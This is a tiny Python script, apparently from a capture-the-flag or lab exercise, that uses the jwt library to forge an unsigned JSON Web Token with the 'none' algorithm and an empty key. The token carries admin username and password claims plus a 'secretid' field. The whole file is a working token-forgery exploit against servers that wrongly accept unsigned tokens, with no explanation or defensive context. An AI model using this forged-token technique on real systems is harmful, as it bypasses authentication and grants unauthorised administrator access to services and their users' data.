import jwt

token = jwt.encode({"secretid":0.4,"username":"admin","password":"admin"},algorithm="none",key="")
print(token)